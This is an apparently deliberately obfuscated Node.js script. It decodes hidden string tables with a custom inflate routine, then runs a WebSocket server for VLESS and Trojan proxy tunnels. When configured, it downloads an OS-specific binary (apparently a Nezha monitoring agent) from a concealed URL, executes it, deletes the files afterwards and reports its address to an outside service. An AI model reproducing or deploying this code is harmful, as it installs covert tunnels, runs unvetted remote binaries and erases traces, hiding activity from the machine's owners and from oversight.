(function(x){var n,Z,C,m;function H(o,$){return o<<$}function L(o,$){return o>>$}function k(o,$){return o<=$}function c(o,$){return o%$}function Y(o,$){return o*$}function l(o,$){return o+$}function e(o,$){return o-$}function z(o,$){return o/$}function Q(o,$){return o<$}function d(o,$){return o>$}function f(o,$){return o>=$}function $(o,$,l){return o[$]=l,o}m=$;let K='fromCharCode|ct|object|d|length|_$a'.split('|');C=Object.assign;Z=JSON.parse;let r=[l('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')],u,P=String[K[0]],O=Uint8Array,h=Uint16Array,V=Uint32Array;n=typeof window===l('obje',K[1])&&window||typeof self===K[2]&&self||exports||typeof globalThis===K[2]&&globalThis||typeof global==='object'&&global;let o=(function(o){var C,r,h,f,V;r=$;let Z=r(r({},'z','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg'),'V','atob');((((f=l(Z.z,'hijklmnopqrstuvwxyz0123456789+/'))&&0||(V=function(f){var o,Z,$;let P=r({},'z','length');for((((o={})||8)&&($=0)||'1')&&(Z=f[P.z]);Q($,Z);$++)o[f[l('char','At')]($)]=$;return o}(f)))&&0||(C=function(Z){var h,f,Q,$;function o(){return r(r(r(r(r(r(r(r(r(r(r(r(r({},'z','th'),'V',4),'y',0),'m',18),'j',1),'h','At'),'S',2),'H',3),'a','charAt'),'c',8),'s',255),'w','join'),'Y','')}let C=o();return($=Z[l('leng',C.z)])&&0||(Q=c($,C.V),h=(d($,C.y)?H(V[Z.charAt(0)],C.m):C.y)|(d($,1)?H(V[Z.charAt(C.j)],12):C.y)|(d($,2)?H(V[Z[l('char',C.h)](C.S)],6):C.y)|(d($,C.H)?V[Z[C.a](C.H)]:0),f=[P(h>>>16),P(h>>>C.c&C.s),P(h&255)],f.length-=[C.y,C.y,C.S,1][Q],f[C.w](C.Y))}))&&null||(h=function(o){return o.replace(/\S{1,4}/g,C)})||7)&&r(o,Z.V,function(P){function o(){return'ace|'.split('|')}let $=o();return h(String(P)[l('repl',$[0])](/[^A-Za-z0-9\+\/]/g,$[1]))})}(n),function(K){var D,F,q,g,J,t,S,i,M,A,m,o,j,r,Z,u,E,x,a,y,W,b,w,R,s,G;a=$;let N='K|prototype|J|length|d'.split('|');((D=8)&&0||(F=!0))&&0||(Z=void 0);function X(o){throw o}function v(P,Q){var Z,f,r,o;r=$;const V=(()=>r(r(r(r(r(r(r(r(r(r(r(r(r({},'z','inp'),'V','ut'),'y',0),'m','index'),'j','c'),'h','ind'),'S','meth'),'H','od'),'a',31),'c',8),'s','B'),'w','buffer'),'Y','bufferSize'))();o=this;(f=void 0,r(r(o,l(V.z,V.V),P),'c',V.y),Q||!(Q={}))&&(Q[V.m]&&(o[V.j]=Q[l(V.h,'ex')])&&0||Q.verify&&(o.N=Q[l('veri','fy')]));(Z=P[o.c++])&&null||(f=P[o[V.j]++]);switch(Z&15){case D:o[l(V.S,V.H)]=D}(0!==c(l(H(Z,8),f),V.a)&&X(Error(l('err:',c(l(H(Z,V.c),f),V.a))))||'0')&&(f&32&&X(Error('not')))&&0||r(o,V.s,new T(P,r(r(r(r({},V.m,o[V.j]),V.Y,Q[l(V.w,'Size')]),'bufferType',Q[l(V.w,'Type')]),'resize',Q[l('resi','ze')])))}((R=(a(v.prototype,'p',function(){var P,o,r,f,l;f=$;const Z=(()=>[0,'p','c',16,8])();return((l=this)&&0||(o=l.input))&&0||(r=void Z[0],P=void 0,r=l.B[Z[1]](),f(l,Z[2],l.B[Z[2]]),l.N&&(P=(H(o[l[Z[2]]++],24)|H(o[l[Z[2]]++],Z[3])|H(o[l.c++],Z[4])|o[l[Z[2]]++])>>>Z[0],P!==jb(r)&&X(Error('i32c'))),r)}),0))||7)&&(A=1);function T(f,r){var o,Z;Z=$;const P=Z(Z(Z(Z(Z(Z(Z(Z(Z(Z(Z(Z(Z(Z(Z(Z(Z(Z(Z(Z({},'z',32768),'V','e'),'y','q'),'m',0),'j','C'),'h','ind'),'S','ex'),'H','index'),'a','buffer'),'c','m'),'s','n'),'w','bufferType'),'Y','resize'),'A','a'),'Z','b'),'t','f'),'U','t'),'J','I'),'r','o'),'p','J');o=this;(Z(Z(Z(Z(Z(Z(Z(o,'l',[]),'m',P.z),P.V,o.g=o.c=o[P.y]=P.m),'input',b?new O(f):f),'s',!1),'n',A),P.j,!1),r||!(r={}))&&(((r[l(P.h,P.S)]&&(o.c=r[P.H])||9)&&(r[l(P.a,'Size')]&&(o[P.c]=r.bufferSize))&&0||r.bufferType&&(o[P.s]=r[P.w])||'1')&&(r[l('resi','ze')]&&(o.C=r[P.Y])));switch(o[P.s]){case R:o.b=P.z;o[P.A]=new(b?O:Array)(l(l(P.z,o.m),258));break;case A:o[P.Z]=0;o.a=new(b?O:Array)(o.m);o[P.t]=o.K;o[P.U]=o[P.J];o[P.r]=o[P.p];break;default:X(Error('imd'))}}(a(T.prototype,N[0],function(r){var Z,V,n,$,P,h,f,o;const C=(()=>['c',1,0,'a','v','G',2,'length',258,'th'])();return(P=this)&&0||(f=l(z(P.input.length,P[C[0]]),C[1])|0,o=void C[2],V=void C[2],n=void C[2],$=P.input,Z=P[C[3]],r&&(l('numb','er')===typeof r.v&&(f=r[C[4]]),l('numb','er')===typeof r.G&&(f+=r[C[5]])),d(C[6],f)?(o=z(e($[C[7]],P[C[0]]),P.u[2]),n=Y(C[8],z(o,2))|C[2],V=Q(n,Z[l('leng',C[9])])?l(Z[C[7]],n):H(Z[C[7]],1)):V=Y(Z.length,f),b?(h=new O(V),h.set(Z)):h=Z,P[C[3]]=h)})&&0||(T[N[1]].I=function(){var o,P,$;const l=['b','length','a','C',0,'buffer'];return(o=this)&&0||(P=o[l[0]],b?o[l[3]]?($=new O(P),$.set(o.a.subarray(l[4],P))):$=o.a.subarray(l[4],P):(d(o.a[l[1]],P)&&(o[l[2]][l[1]]=P),$=o[l[2]]),o[l[5]]=$)}))&&0||(T[l('proto','type')][N[2]]=function(H,z){var h,K,P,V,O,Z,Y,n,C;O=$;let u=O(O(O(O(O(O(O(O(O(O({},'z','a'),'V',256),'y',257),'m',0),'j','f'),'h','length'),'S','leng'),'H','th'),'a',8),'c','e');for(((((V=this)&&0||(C=V[u.z])||9)&&(P=V.b)||4)&&O(V,'u',H)||true)&&(n=C[l('leng','th')]);u.V!==(K=I(V,H));)if(d(u.V,K)){f(P,n)&&(C=V.f(),n=C[l(u.S,u.H)])&&0||(C[P++]=K)}else{for(((((((Z=e(K,u.y))&&0||(Y=r[Z])||7)&&(Q(u.m,q[Z])&&(Y+=U(V,q[Z])))||9)&&(K=I(V,z))||'0')&&(h=o[K])||5)&&(Q(0,x[K])&&(h+=U(V,x[K])))||5)&&(d(l(P,Y),n)&&(C=V[u.j](),n=C[u.h]));Y--;)C[P]=C[e(P++,h)]}for(;k(u.a,V[u.c]);)V[u.c]-=u.a,V.c--;O(V,'b',P)});function C(P){var o,O,p,$,C,l,h,r,Z,u,n,x,Y;function z(){return'length|POSITIVE_INFINITY'.split('|')}let f=z();((h=P[f[0]])&&false||(l=0)||1)&&(u=Number[f[1]]);for(O=0;Q(O,h);++O)d(P[O],l)&&(l=P[O]),Q(P[O],u)&&(u=P[O]);for(r=(Z=H(1,l),n=new(b?V:Array)(Z),$=1,Y=0,2);k($,l);){for(O=0;Q(O,h);++O)if(P[O]===$){for(p=(C=0,o=Y,0);Q(p,$);++p)C=H(C,1)|o&1,o>>=1;for(p=(x=H($,16)|O,C);Q(p,Z);p+=r)n[p]=x;++Y}(++$&&0||(Y<<=1))&&0||(r<<=1)}return[n,l,u]}function I(u,h){var Y,n,C,P,O,o,Z,x,r,V;Y=$;let l=Y(Y(Y(Y(Y(Y({},'z','g'),'V','e'),'y',0),'m',1),'j','c'),'h',65535);for(((((((Z=u[l.z])||9)&&(n=u[l.V])||7)&&(P=u.input)&&0||(O=u.c))&&false||(o=P.length)||7)&&(V=h[l.y])||'0')&&(x=h[l.m]);Q(n,x)&&!f(O,o);)Z|=H(P[O++],n),n+=8;return C=V[Z&e(H(l.m,x),l.m)],r=C>>>16,Y(Y(Y(u,l.z,L(Z,r)),'e',e(n,r)),l.j,O),C&l.h}function n(Z){var Y,x,P,H,r,o,V,n,u;Y=$;function f(){return[5,257,4,'leng','th',0,3,'call']}let z=f();function h(H,V,Z){var C,f,o,P,r,n;C=$;const h=C(C(C(C(C(C(C({},'z','z'),'V',3),'y',2),'m',16),'j',17),'h',11),'S',0);((f=this)||7)&&(o=f[h.z]);for(P=0;Q(P,H);)switch(r=I(f,V),r){case h.m:for(n=l(h.V,U(f,h.y));n--;)Z[P++]=o;break;case h.j:for(n=l(3,U(f,3));n--;)Z[P++]=0;o=0;break;case 18:for(n=l(h.h,U(f,7));n--;)Z[P++]=h.S;o=h.S;break;default:o=Z[P++]=r}return C(f,h.z,o),Z}((((P=l(U(Z,z[0]),z[1]))&&0||(n=l(U(Z,5),1))||true)&&(r=l(U(Z,4),z[2]))||1)&&(H=new(b?O:Array)(m[l(z[3],z[4])]))&&null||(x=void 0)||9)&&(V=void z[5]);for(u=0;Q(u,r);++u)H[m[u]]=U(Z,z[6]);if(!b){for(r=(u=r,H.length);Q(u,r);++u)H[m[u]]=z[5]}(((((o=C(H))||9)&&(x=new(b?O:Array)(P))||5)&&(V=new(b?O:Array)(n))||'1')&&Y(Z,'z',0)||'1')&&Z.o(C(h.call(Z,P,o,x)),C(h[z[7]](Z,n,o,V)))}function U(h,x){var n,V,O,u,o,r,Z;u=$;function P(){return['g','e','ut','bk',8]}let C=P();for(((((r=h[C[0]])&&0||(o=h[C[1]]))&&0||(n=h[l('inp',C[2])]))&&0||(O=h.c))&&0||(Z=n.length);Q(o,x);)f(O,Z)&&X(Error(C[3])),r|=H(n[O++],o),o+=C[4];return V=r&e(H(1,x),1),u(u(u(h,'g',r>>>x),C[1],e(o,x)),'c',O),V}t=(T.prototype.p=function(){var Y,r,C,Q,z,x,O,$,o,P,V;let h=(()=>'s|a|th|e|iN|length|ib|subar|b|f|v|t'.split('|'))();for(r=this;!r.s;){(((C=U(r,3))||5)&&(C&1&&(r[h[0]]=F))||9)&&(C>>>=1);switch(C){case 0:Y=r.input;V=r.c;o=r[h[1]];x=r.b;z=Y[l('leng',h[2])];$=Z;Q=Z;O=o[l('leng',h[2])];P=Z;r[h[3]]=r.g=0;f(l(V,1),z)&&X(Error('iL'));$=Y[V++]|H(Y[V++],8);f(l(V,1),z)&&X(Error(h[4]));Q=Y[V++]|H(Y[V++],8);$===~Q&&X(Error('ih'));d(l(V,$),Y[h[5]])&&X(Error(h[6]));switch(r.n){case R:for(;d(l(x,$),o[l('leng','th')]);){if(P=e(O,x),$-=P,b){(o.set(Y[l(h[7],'ray')](V,l(V,P)),x)||1)&&(x+=P)&&0||(V+=P)}else{for(;P--;)o[x++]=Y[V++]}(((r[h[8]]=x)||'1')&&(o=r[h[9]]())||'1')&&(x=r.b)}break;case A:for(;d(l(x,$),o[h[5]]);)o=r.f(a({},h[10],2));break;default:X(Error('im'))}if(b){(o.set(Y.subarray(V,l(V,$)),x)||4)&&(x+=$)&&null||(V+=$)}else{for(;$--;)o[x++]=Y[V++]}r.c=V;r.b=x;r.a=o;break;case 1:r.o(y,w);break;case 2:n(r);break;default:X(Error(l('e: ',C)))}}return B(r[h[11]]())},'undefined');b=t!==typeof O&&t!==typeof h&&t!==typeof V&&t!==typeof DataView;m=(S=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15],b?new h(S):S);r=(u=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258,258,258],b?new h(u):u);q=(W=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0,0,0],b?new O(W):W);o=(g=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577],b?new h(g):g);x=(j=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13],b?new O(j):j);E=new(b?O:Array)(288);for(i=(i=void 0,M=0,E[N[3]]);Q(M,i);++M)E[M]=f(143,M)?8:f(255,M)?9:f(279,M)?7:8;y=C(E);G=new(b?O:Array)(30);for(s=(s=void 0,J=0,G[N[3]]);Q(J,s);++J)G[J]=5;w=C(G);function B(f){var r,C,Z,V,l,o;const $=(()=>a(a(a(a(a(a(a(a(a(a({},'z',0),'V','length'),'y',2),'m',7),'j',12),'h',31),'S',63),'H',6),'a',14),'c',4))();(((r=void $.z)&&0||(o=''))&&0||(r=f[$.V]))&&0||(l=$.z);while(Q(l,r)){V=f[l++];switch(L(V,$.c)){case 0:case 1:case $.y:case 3:case 4:case 5:case 6:case $.m:o+=P(V);break;case $.j:case 13:C=f[l++];o+=P(H(V&$.h,6)|C&$.S);break;case $.a:C=f[l++];Z=f[l++];o+=P(H(V&15,12)|H(C&63,$.H)|H(Z&$.S,$.z))}}return o}K[N[4]]=function(o){const f=a({},'z','p');let $=new v(new O(K.atob(o).split('').map($=>{const o=(()=>a({},'z',0))();return $[l('charCo','deAt')](o.z)})),{}),P=$[f.z]();return P}}(n),u=typeof globalThis==='object'&&globalThis||typeof window===K[2]&&window||typeof self==='object'&&self||typeof global===K[2]&&global,!0);for(let $ of r)($=n[K[3]]($),$=Z($),o)?C(u,$):((u.StringExtract=$)||true)&&C(u,$);for(let o=0;Q(o,x[K[4]]);o++)u[l('_$a',o)]&&C(u,m({},u[l(K[5],o)],x[o]))}([{itZF:true},41,console.error,parseInt,true,encodeURIComponent,console.log,false]));const os=require(RRN),http=require(dRN),fs=require(fRN),axios=require(HRN),net=require(cRN),path=require(gRN),crypto=require(eRN),$v80ky5=require(iRN),Buffer=$v80ky5[NRN],$vTvpym=require(jRN),exec=$vTvpym[FRN],execSync=$vTvpym[lRN],$vsze1p=require(MRN),WebSocket=$vsze1p[aRN],createWebSocketStream=$vsze1p[SRN],UUID=process[IRN][bRN]||YRN,NEZHA_SERVER=process[IRN][DRN]||'',NEZHA_PORT=process[IRN][$RN]||'',NEZHA_KEY=process[IRN][PRN]||'',DOMAIN=process[IRN][XRN]||CRN,AUTO_ACCESS=process[IRN][sRN]||!0,WSPATH=process[IRN][GRN]||UUID[BRN](TRN,WRN),SUB_PATH=process[IRN][tRN]||kRN,NAME=process[IRN][nRN]||vRN,PORT=process[IRN][yRN]||JRN;let ISP='';const GetISP=async()=>{try{const h=await axios.get(uNN),t=h[QNN];ISP=(t[TNN]+JNN+t[WNN])[UNN](/ /g,'_')}catch(h){ISP=VNN}};GetISP();const httpServer=http[qNN]((t,h)=>{if(t[mNN]==='/'){const t=path[HNN](__dirname,cNN);fs[gNN](t,eNN,(t,i)=>{if(t){h[zNN](mRN,{[KNN]:iNN}),h[hNN](NNN);return}h[zNN](mRN,{[KNN]:iNN}),h[hNN](i)});return}else{if(t[mNN]===_NN+SUB_PATH){const H=ANN+UUID+pNN+DOMAIN+rNN+DOMAIN+ENN+DOMAIN+oNN+WSPATH+ONN+NAME+JNN+ISP,c=xNN+UUID+pNN+DOMAIN+ZNN+DOMAIN+ENN+DOMAIN+oNN+WSPATH+ONN+NAME+JNN+ISP,i=H+'\n'+c,t=Buffer[dNN](i)[RNN](fNN);h[zNN](mRN,{[KNN]:LNN}),h[hNN](t+'\n')}else{h[zNN](qRN,{[KNN]:LNN}),h[hNN](wNN)}}}),wss=new WebSocket[jNN]({[FNN]:httpServer}),uuid=UUID[UNN](/-/g,''),DNS_SERVERS=[lNN,MNN];function resolveHost(h){return new Promise((resolve,reject)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[aNN](h)){resolve(h);return}let i=TRN;function t(){if(i>=DNS_SERVERS[SNN]){reject(new Error(bNN+h+INN));return}const H=DNS_SERVERS[i];i++;const c=YNN+VRN(h)+DNN;axios.get(c,{[XNN]:_RN,[GNN]:{[sNN]:CNN}})[PNN](i=>{const h=i[QNN];if(h[BNN]===TRN&&h[tNN]&&h[tNN][SNN]>TRN){const t=h[tNN][kNN](h=>h[nNN]===zRN);if(t){resolve(t[QNN]);return}}t()})[$NN](h=>((t()),void 0))}t()})}function handleVlessConnection(b,h){var t=zRN,i=BRN;const [r]=h,m=h[i](t,LRN);if(!m[vNN]((h,t)=>h==uRN(uuid[yNN](t*KRN,KRN),hRN))){return!1}let T=h[i](LRN,wRN)[VjN]()+ARN;const H=h[i](T,T+=KRN)[ujN](TRN),c=h[i](T,T+=t)[VjN](),C=c==t?h[i](T,T+=rRN)[HNN]('.'):c==KRN?new TextDecoder()[WjN](h[i](T+t,T+=t+h[i](T,T+t)[VjN]())):c==pRN?h[i](T,T+=hRN)[UjN]((i,t,c,h)=>c%KRN?i[TjN](h[BRN](c-zRN,c+zRN)):i,[])[QjN](h=>h[ujN](TRN)[RNN](hRN))[HNN](':'):'';b[JjN](new Uint8Array([r,TRN]));const g=createWebSocketStream(b);resolveHost(C)[PNN](t=>((net[mjN]({[_jN]:t,[zjN]:H},function(){this[LjN](h[BRN](T)),g[qjN](hjN,()=>{})[KjN](this)[qjN](hjN,()=>{})[KjN](g)})[qjN](hjN,()=>{})),void 0))[$NN](t=>((net[mjN]({[_jN]:C,[zjN]:H},function(){this[LjN](h[BRN](T)),g[qjN](hjN,()=>{})[KjN](this)[qjN](hjN,()=>{})[KjN](g)})[qjN](hjN,()=>{})),void 0));return!0}function handleTrojanConnection(c,h){var t=zRN,i=BRN;try{if(h[SNN]<ERN){return!1}const b=h[i](TRN,oRN)[RNN](),H=[UUID];let C=null;for(const h of H){const t=crypto[pjN](rjN)[AjN](h)[wjN](EjN);if(t===b){C=h;break}}if(!C){return!1}let offset=oRN;if(h[offset]===ORN&&h[offset+t]===xRN){offset+=KRN}const D=h[offset];if(D!==t){return!1}offset+=t;const T=h[offset];offset+=t;let g,r;if(T===t){g=h[i](offset,offset+rRN)[HNN]('.'),offset+=rRN}else{if(T===pRN){const c=h[offset];offset+=t,g=h[i](offset,offset+c)[RNN](),offset+=c}else{if(T===rRN){g=h[i](offset,offset+hRN)[UjN]((i,t,c,h)=>c%KRN?i[TjN](h[BRN](c-zRN,c+zRN)):i,[])[QjN](h=>h[ujN](TRN)[RNN](hRN))[HNN](':'),offset+=hRN}else{return!1}}}r=h[ujN](offset),offset+=KRN;if(offset<h[SNN]&&h[offset]===ORN&&h[offset+t]===xRN){offset+=KRN}const m=createWebSocketStream(c);resolveHost(g)[PNN](t=>((net[mjN]({[_jN]:t,[zjN]:r},function(){if(offset<h[SNN]){this[LjN](h[BRN](offset))}m[qjN](hjN,()=>{})[KjN](this)[qjN](hjN,()=>{})[KjN](m)})[qjN](hjN,()=>{})),void 0))[$NN](t=>((net[mjN]({[_jN]:g,[zjN]:r},function(){if(offset<h[SNN]){this[LjN](h[BRN](offset))}m[qjN](hjN,()=>{})[KjN](this)[qjN](hjN,()=>{})[KjN](m)})[qjN](hjN,()=>{})),void 0));return!0}catch(H){return!1}}wss[qjN](ojN,(h,i)=>{const t=i[mNN]||'';h[OjN](xjN,t=>{if(t[SNN]>LRN&&t[TRN]===TRN){const i=t[BRN](zRN,LRN),c=i[vNN]((h,t)=>h==uRN(uuid[yNN](t*KRN,KRN),hRN));if(c){if(!handleVlessConnection(h,t)){h[ZjN]()}return}}if(!handleTrojanConnection(h,t)){h[ZjN]()}})[qjN](hjN,()=>{})});const getDownloadUrl=()=>{const h=os[RjN]();return h===djN||h===fjN||h===HjN?!NEZHA_PORT?ijN:ejN:!NEZHA_PORT?gjN:cjN},downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY){return}try{const i=getDownloadUrl(),h=await axios({[NjN]:'get',[mNN]:i,[FjN]:jjN}),t=fs[ljN](MjN);h[QNN][KjN](t);return new Promise((resolve,reject)=>((t[qjN](ajN,()=>((QRN(SjN)),(exec(bjN,h=>{if(h){reject(h)}resolve()})),void 0))),(t[qjN](hjN,reject)),void 0))}catch(h){throw h}},runnz=async()=>{try{const status=execSync(IjN,{[DjN]:YjN});if(status[$jN]()!==''){QRN(PjN);return}}catch(t){}await downloadFile();let c='',h=[XjN,CjN,sjN,GjN,BjN,tjN];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const t=h[njN](NEZHA_PORT)?_8N:'';c=z8N+NEZHA_SERVER+L8N+NEZHA_PORT+K8N+NEZHA_KEY+h8N+t+w8N}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const i=NEZHA_SERVER[njN](':')?NEZHA_SERVER[yjN](':')[vjN]():'',t=h[njN](i)?u8N:V8N,c=Q8N+NEZHA_KEY+U8N+NEZHA_SERVER+T8N+t+W8N+UUID;fs[J8N](q8N,c)}c=m8N}else{QRN(kjN);return}}try{exec(c,{[r8N]:p8N},h=>{if(h){URN(o8N,h)}else{QRN(E8N)}})}catch(i){URN(A8N+i)}};async function addAccessTask(){if(!AUTO_ACCESS){return}if(!DOMAIN){return}const h=O8N+DOMAIN+_NN+SUB_PATH;try{const t=await axios[x8N](Z8N,{[mNN]:h},{[GNN]:{[KNN]:R8N}});QRN(d8N)}catch(t){}}const delFiles=()=>((fs[f8N](MjN,()=>{})),(fs[f8N](q8N,()=>{})),void 0);httpServer[H8N](PORT,()=>((runnz()),(setTimeout(()=>((delFiles()),void 0),ZRN)),(addAccessTask()),(QRN(c8N+PORT)),void 0))
